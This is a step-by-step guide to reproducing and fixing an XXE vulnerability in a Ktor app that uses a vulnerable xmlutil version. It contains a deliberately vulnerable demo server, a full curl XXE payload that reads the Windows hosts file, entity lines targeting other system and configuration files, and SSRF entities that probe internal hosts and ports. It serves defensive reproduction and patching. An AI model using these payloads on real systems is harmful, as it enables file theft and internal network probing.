# CVE-2023-45612 Reproduction Steps
## Step-by-Step Guide to Reproduce XXE Vulnerability in Ktor

---

## Prerequisites

- **Java 11 or later**
- **Gradle 7.0+**
- **Python 3.6+** (for POC script)
- **Windows environment** (for file path testing)

---

## Step 1: Set Up Vulnerable Environment

### 1.1 Create Vulnerable Ktor Application

Create the following project structure:

```
ktor-xxe-demo/
├── build.gradle.kts
├── gradle/
│   └── libs.versions.toml
├── src/main/kotlin/
│   ├── Application.kt
│   ├── Routing.kt
│   └── Serialization.kt
└── src/main/resources/
    └── application.yaml
```

### 1.2 Configure Vulnerable Dependencies

**gradle/libs.versions.toml:**
```toml
[versions]
kotlin = "2.2.20"
ktor = "2.2.4"        # VULNERABLE VERSION
xmlutil = "0.86.1"    # VULNERABLE VERSION
logback = "1.4.14"

[libraries]
ktor-server-core = { module = "io.ktor:ktor-server-core-jvm", version.ref = "ktor" }
ktor-server-netty = { module = "io.ktor:ktor-server-netty", version.ref = "ktor" }
ktor-server-content-negotiation = { module = "io.ktor:ktor-server-content-negotiation", version.ref = "ktor" }
xmlutil-core = { module = "io.github.pdvrieze.xmlutil:core-jvm", version.ref = "xmlutil" }
xmlutil-serialization = { module = "io.github.pdvrieze.xmlutil:serialization-jvm", version.ref = "xmlutil" }
logback-classic = { module = "ch.qos.logback:logback-classic", version.ref = "logback" }

[plugins]
kotlin-jvm = { id = "org.jetbrains.kotlin.jvm", version.ref = "kotlin" }
ktor = { id = "io.ktor.plugin", version.ref = "ktor" }
```

**build.gradle.kts:**
```kotlin
plugins {
    alias(libs.plugins.kotlin.jvm)
    alias(libs.plugins.ktor)
}

group = "com.example"
version = "0.0.1"

application {
    mainClass = "io.ktor.server.netty.EngineMain"
}

dependencies {
    implementation(libs.ktor.server.core)
    implementation(libs.ktor.server.netty)
    implementation(libs.ktor.server.content.negotiation)
    implementation(libs.xmlutil.core)
    implementation(libs.xmlutil.serialization)
    implementation(libs.logback.classic)
}
```

### 1.3 Create Vulnerable Application Code

**src/main/kotlin/Application.kt:**
```kotlin
package com.example

import io.ktor.server.application.*

fun main(args: Array<String>) {
    io.ktor.server.netty.EngineMain.main(args)
}

fun Application.module() {
    configureSerialization()
    configureRouting()
}
```

**src/main/kotlin/Serialization.kt:**
```kotlin
package com.example

import io.ktor.http.*
import io.ktor.server.application.*
import io.ktor.server.plugins.contentnegotiation.*
import nl.adaptivity.xmlutil.serialization.*
import kotlinx.serialization.Serializable

@Serializable
data class UserData(val name: String, val email: String)

fun Application.configureSerialization() {
    install(ContentNegotiation) {
        // VULNERABLE: Uses default xmlutil configuration
        // which processes external entities by default in version 0.86.1
        val xmlFormat = XML()
        register(ContentType.Application.Xml, XmlConverter(xmlFormat))
        register(ContentType.Text.Xml, XmlConverter(xmlFormat))
    }
}
```

**src/main/kotlin/Routing.kt:**
```kotlin
package com.example

import io.ktor.server.application.*
import io.ktor.server.request.*
import io.ktor.server.response.*
import io.ktor.server.routing.*

fun Application.configureRouting() {
    routing {
        get("/") {
            call.respondText("Ktor XXE Demo - CVE-2023-45612")
        }
        
        post("/xml") {
            try {
                // VULNERABLE: ContentNegotiation processes XML with external entities
                val userData = call.receive<UserData>()
                call.respondText("Received user: ${userData.name} with email: ${userData.email}")
            } catch (e: Exception) {
                call.respondText("Error processing XML: ${e.message}")
            }
        }
    }
}
```

**src/main/resources/application.yaml:**
```yaml
ktor:
  application:
    modules:
      - com.example.ApplicationKt.module
  deployment:
    port: 8080
```

---

## Step 2: Build and Run Vulnerable Application

### 2.1 Build the Application
```bash
./gradlew build
```

### 2.2 Start the Server
```bash
./gradlew run
```

You should see output similar to:
```
Application started in 0.253 seconds.
Responding at http://127.0.0.1:8080
```

---

## Step 3: Test for Vulnerability

### 3.1 Download the Simple POC Script

Save the `simple_xxe_poc.py` script to your project directory.

### 3.2 Run the POC Script

```bash
python simple_xxe_poc.py http://localhost:8080
```

### 3.3 Expected Output (Vulnerable System)

```
============================================================
CVE-2023-45612 XXE Vulnerability Test
============================================================
Target: http://localhost:8080
File to read: C:\Windows\System32\drivers\etc\hosts

✓ Server is accessible (Status: 200)
Sending XXE payload to /xml endpoint...

Response Status: 200
Response Body:
----------------------------------------
Received user: # Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
#
# This file contains the mappings of IP addresses to host names. Each
# entry should be kept on an individual line. The IP address should
# be placed in the first column followed by the corresponding host name.
# The IP address and the host name should be separated by at least one
# space.
#
# Additionally, comments (such as these) may be inserted on individual
# lines or following the machine name denoted by a '#' symbol.
#
# For example:
#
#      102.54.94.97     rhino.acme.com          # source server
#       38.25.63.10     x.acme.com              # x client host

# localhost name resolution is handled within DNS itself.
#	127.0.0.1       localhost
#	::1             localhost with email: test@example.com
----------------------------------------

🚨 VULNERABILITY CONFIRMED!
✓ XXE attack successful - file contents leaked
✓ CVE-2023-45612 vulnerability present

IMPACT:
- Sensitive files can be read from the server
- Server-side request forgery (SSRF) possible
- Potential for further exploitation

RECOMMENDATION:
- Update Ktor to version 2.3.5 or later
- Update xmlutil to version 0.86.2 or later
- Review XML processing security configuration

⚠️  SECURITY RISK: This application is vulnerable to CVE-2023-45612
```

---

## Step 4: Manual Testing (Alternative)

### 4.1 Using curl

```bash
curl -X POST http://localhost:8080/xml \
  -H "Content-Type: application/xml" \
  -d '<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE UserData [
<!ELEMENT UserData ANY>
<!ELEMENT name ANY>
<!ELEMENT email ANY>
<!ENTITY xxe SYSTEM "file:///C:/Windows/System32/drivers/etc/hosts">
]>
<UserData>
    <name>&xxe;</name>
    <email>test@example.com</email>
</UserData>'
```

### 4.2 Using Postman

1. Create a new POST request to `http://localhost:8080/xml`
2. Set Content-Type header to `application/xml`
3. Set the request body to the XXE payload above
4. Send the request
5. Check if the response contains file contents

---

## Step 5: Verify Impact

### 5.1 Test Different Files

Try reading other sensitive files:

```xml
<!-- Windows system files -->
<!ENTITY xxe SYSTEM "file:///C:/Windows/win.ini">
<!ENTITY xxe SYSTEM "file:///C:/Windows/system.ini">

<!-- Application files -->
<!ENTITY xxe SYSTEM "file:///C:/path/to/application.properties">
```

### 5.2 Test SSRF

```xml
<!-- Internal network scan -->
<!ENTITY xxe SYSTEM "http://192.168.1.1:80">
<!ENTITY xxe SYSTEM "http://localhost:3306">
```

---

## Step 6: Fix the Vulnerability

### 6.1 Update Dependencies

Update `gradle/libs.versions.toml`:
```toml
ktor = "2.3.5"        # FIXED VERSION
xmlutil = "0.86.2"    # FIXED VERSION
```

### 6.2 Secure XML Configuration

Update `Serialization.kt`:
```kotlin
fun Application.configureSerialization() {
    install(ContentNegotiation) {
        // SECURE: Disable external entity processing
        val secureXmlFormat = XML {
            xmlDeclMode = XmlDeclMode.Auto
            indent = 2
            repairNamespaces = true
            // External entities are disabled by default in 0.86.2+
        }
        register(ContentType.Application.Xml, XmlConverter(secureXmlFormat))
    }
}
```

### 6.3 Verify Fix

1. Rebuild and restart the application
2. Run the POC script again
3. Verify that the vulnerability is no longer present

---

## Expected Results After Fix

```
============================================================
CVE-2023-45612 XXE Vulnerability Test
============================================================
Target: http://localhost:8080
File to read: C:\Windows\System32\drivers\etc\hosts

✓ Server is accessible (Status: 200)
Sending XXE payload to /xml endpoint...

Response Status: 200
Response Body:
----------------------------------------
Received user: &xxe; with email: test@example.com
----------------------------------------

✓ No XXE vulnerability detected
Server appears to be patched or not vulnerable

✅ SECURE: No XXE vulnerability detected
```

---

## Troubleshooting

### Common Issues:

1. **Server won't start**: Check Java version and Gradle compatibility
2. **Build fails**: Ensure all dependencies are correctly specified
3. **POC script fails**: Verify Python version and requests library installation
4. **No file contents**: Check file paths and permissions on target system

### Debug Commands:

```bash
# Check Java version
java --version

# Check Gradle version  
./gradlew --version

# Install Python dependencies
pip install requests

# Check server logs
./gradlew run --info
```

---

This reproduction guide demonstrates the complete process of setting up, testing, and fixing CVE-2023-45612 in a Ktor application.
